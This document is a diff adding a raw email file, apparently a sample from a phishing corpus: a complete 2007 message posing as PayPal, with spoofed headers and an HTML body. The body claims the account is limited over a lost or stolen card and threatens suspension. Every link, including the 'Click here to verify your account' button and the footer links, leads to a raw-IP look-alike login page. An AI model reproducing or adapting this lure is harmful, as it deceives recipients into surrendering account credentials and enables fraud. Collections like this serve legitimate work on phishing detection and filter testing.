@@ -1,0 +1,327 @@
+Return-Path: <account@PayPal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id F40E44691F
+	for <user@login.example.com>; Mon, 19 Feb 2007 08:23:51 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 42B66131FD62
+	for <user@example.com>; Mon, 19 Feb 2007 08:24:21 -0500 (EST)
+Received: from 204.176.49.100 (S0106000f669519bc.vs.shawcable.net [70.71.223.189])
+	by mail.example.org (Postfix) with SMTP id 647456FA1A8
+	for <user@example.com>; Mon, 19 Feb 2007 08:24:16 -0500 (EST)
+Received: from 157.36.63.14 by ; Mon, 19 Feb 2007 09:17:15 -0400
+Message-ID: <SZPLHCTIULQKVHOKINEATJJ@aol.com>
+From: "PayPal Inc." <account@PayPal.com>
+Reply-To: "PayPal Inc." <account@PayPal.com>
+To: user@example.com
+Subject: Confirm your PayPal account
+Date: Mon, 19 Feb 2007 07:22:15 -0600
+X-Mailer: Internet Mail Service (5.5.2650.21)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--0036558409061299778"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 850
+
+----0036558409061299778
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+
+<head>
+<meta http-equiv=3D"Content-Language" content=3D"en-us">
+<meta name=3D"GENERATOR" content=3D"Microsoft FrontPage 5.0">
+<meta name=3D"ProgId"
+content=3D"FrontPage.Editor.Document">
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859=
+-1">
+<title></title>
+<style>
+<!--
+#message td {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+#message .pp_heading {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}
+#message .pp_sansserif{font-family:
+verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+#message hr.dotted {width: 100%; margin-top: 0px;
+margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff;
+border-bottom: 2px dotted #ccc;}
+#message .pp_footer {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+-->
+</style>
+</head>
+
+<body>
+
+<table class=3D"messageheader" cellSpacing=3D"0"
+cellPadding=3D"0" width=3D"100%" border=3D"0">
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+<div id=3D"message" style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color: #000000">
+  <xmeta Content=3D"Microsoft DHTML Editing Control"
+NAME=3D"GENERATOR" />
+  <xbody />
+  <style type=3D"text/css">
+#message .dummy {}
+#message td {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+#message {font-family:
+4verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+#message LI {line-height: 120%;}
+#message UL.ppsmallborder {margin:10px 5px 10px 20px;}
+#message LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+#message UL.pp_narrow {margin:10px 5px 0px 40px;}
+#message hr.dotted {width: 100%; margin-top: 0px;
+margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff;
+border-bottom: 2px dotted #ccc;}
+#message .pp_label {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+#message .pp_serifbig {font-family: serif;font-size:
+20px;font-weight: bold;color:
+#000000;}
+#message .pp_serif{font-family: serif;font-size:
+16px;color: #000000;}
+#message .pp_sansserif{font-family:
+verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+#message .pp_heading {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}
+#message .pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+15px;font-weight: bold;color:
+#000000;}
+#message .pp_subheading {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}
+#message .pp_sidebartext {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}
+#message .pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+11px;font-weight: bold;color:
+#003366;}
+#message .pp_footer {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+#message .pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400;
+border-style:outset;
+color:#000000; background-color: #cccccc;}
+#message .pp_smaller {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+#message .pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #003366;}
+#message .ppem106 {font-weight: 700;}
+  </style>
+  <table cellSpacing=3D"0" cellPadding=3D"0" width=3D"600"
+align=3D"center" border=3D"0">
+    <tr vAlign=3D"top">
+      <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color:
+#000000">
+      <a
+href=3D"http://66.127.166.126:84/www.paypal.com/cgi-bin/webscrcmd=3D_login=
+-run/index.htm"
+target=3D"_blank">
+      <img alt=3D"PayPal"
+src=3D"http://images.paypal.com/en_US/i/logo/email_logo.gif"
+border=3D"0"
+width=3D"255" height=3D"35"></a>
+      </td>
+    </tr>
+  </table>
+  <table cellSpacing=3D"0" cellPadding=3D"0" width=3D"100%"
+border=3D"0">
+    <tr>
+      <td width=3D"100%"
+background=3D"http://images.paypal.com/images/bg_clk.gif"
+style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color: #000000">
+      <img height=3D"29"
+src=3D"http://images.paypal.com/images/pixel.gif"
+width=3D"1"
+border=3D"0"></td>
+    </tr>
+    <tr>
+      <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color:
+#000000">
+      <img height=3D"10"
+src=3D"http://images.paypal.com/images/pixel.gif"
+width=3D"1"
+border=3D"0"></td>
+    </tr>
+  </table>
+  <table cellSpacing=3D"0" cellPadding=3D"0" width=3D"600"
+align=3D"center" border=3D"0">
+    <tr vAlign=3D"top">
+      <td width=3D"400" style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color: #000000">
+      <table cellSpacing=3D"0" cellPadding=3D"5"
+width=3D"417" border=3D"0">
+        <tr vAlign=3D"top">
+          <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color:
+#000000" width=3D"407">
+          <table cellSpacing=3D"0" cellPadding=3D"0"
+width=3D"100%" border=3D"0">
+            <tr>
+              <td class=3D"pp_heading" align=3D"left"><br>
+              Notification of Limited Account Access</td>
+            </tr>
+          </table>
+          </td>
+        </tr>
+        <tr>
+          <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color:
+#000000" width=3D"407">
+          <p align=3D"left">
+          <br>
+          As part of our security measures, we regularly screen activity i=
+n the
+PayPal system. We recently noticed the following issue on your account:
+<br>
+          <br>
+         Unusual account activity has made it necessary to limit sensitive=
+ account 
+          features
+until additional verification information can be collected. </p>
+          <p style=3D"margin-top: 0px; margin-bottom: 0px" align=3D"left">=
+We have 
+          been notified <tt><font face=3D"verdana,arial,helvetica,sans-ser=
+if">that 
+          a card associated with your account has been reported as lost or=
+ 
+          stolen, or that there were additional problems with your card.</=
+font></tt></p>
+          <p>Case ID Number: PP-071-362-996
+
+          <br>
+          &nbsp;</p>
+          <table cellSpacing=3D"0" cellPadding=3D"1"
+width=3D"75%" align=3D"left" bgColor=3D"#ffe65c"
+border=3D"0">
+            <tr>
+              <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color: #000000">
+              <table cellSpacing=3D"0" cellPadding=3D"4"
+width=3D"100%" align=3D"center"
+bgColor=3D"#fffecd" border=3D"0">
+                <tr>
+                  <td class=3D"pp_sansserif"
+align=3D"middle">
+                  <a target=3D"_blank" href=3D"http://66.127.166.126:84/ww=
+w.paypal.com/cgi-bin/webscrcmd=3D_login-run/index.htm">Click here to verif=
+y your
+account</a></td>
+                </tr>
+              </table>
+              </td>
+            </tr>
+          </table>
+          <p><br>
+          <br>
+	  <br>
+          Please understand that this is a 
+security
+measure intended to help protect you and your account. We apologize for 
+any
+inconvenience.
+ <br>
+          <br>
+          
+          <br>
+          If you choose to ignore our request, you
+leave us no choice but to
+          temporary suspend your account.<br>
+          <br>
+          Sincerely,<br>
+PayPal Account Review Department.
+
+</td>
+        </tr>
+        <tr>
+          <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color:
+#000000" width=3D"407">
+          <hr class=3D"dotted"></td>
+        </tr>
+        <tr>
+          <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color:
+#000000" width=3D"407">
+          <table cellSpacing=3D"0" cellPadding=3D"0"
+width=3D"100%" border=3D"0">
+            <tr>
+              <td class=3D"pp_footer">Please do not
+reply to this e-mail. Mail
+              sent to this address cannot be answered.
+For assistance,
+              <a target=3D"_blank" href=3D"http://66.127.166.126:84/www.pa=
+ypal.com/cgi-bin/webscrcmd=3D_login-run/index.htm">log in</a> to your PayP=
+al account and
+choose the &quot;Help&quot; link in
+              the footer of any page.<br>
+              <br class=3D"h10">
+              To receive email notifications in plain
+text instead of HTML,
+              update your preferences
+              <a target=3D"_blank" href=3D"http://66.127.166.126:84/www.pa=
+ypal.com/cgi-bin/webscrcmd=3D_login-run/index.htm">here</a>. </td>
+            </tr>
+            <tr>
+              <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color: #000000">
+              <img height=3D"10"
+src=3D"http://images.paypal.com/en_US/i/scr/pixel.gif"
+width=3D"1"
+border=3D"0"></td>
+            </tr>
+          </table>
+          </td>
+        </tr>
+        <tr>
+          <td style=3D"font-family:
+verdana,arial,helvetica,sans-serif; font-size: 12px;
+color:
+#000000" width=3D"407">
+          <br>
+          <span class=3D"pp_footer">
+
+----0036558409061299778--
+
